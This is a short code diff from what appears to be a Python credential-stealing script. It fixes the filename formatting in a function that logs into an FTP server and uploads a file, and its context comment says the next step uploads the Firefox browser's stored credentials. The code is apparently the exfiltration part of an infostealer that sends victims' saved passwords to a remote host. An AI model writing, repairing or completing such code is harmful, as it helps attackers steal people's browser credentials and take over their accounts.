@@ -8,7 +8,7 @@ def upload_file(filename):
     ftp = FTP(ftp_address)
     ftp.login(ftp_username,ftp_password)
     with open(filename, "rb") as file:
-        ftp.storbinary(f"STOR {filename.split('/')[-1]+f"{round(time())}"}", file)
+        ftp.storbinary(f"STOR {filename.split('/')[-1]}"+f"{round(time())}", file)
     ftp.quit()
 
 # Upload the stored credentials of firefox browser
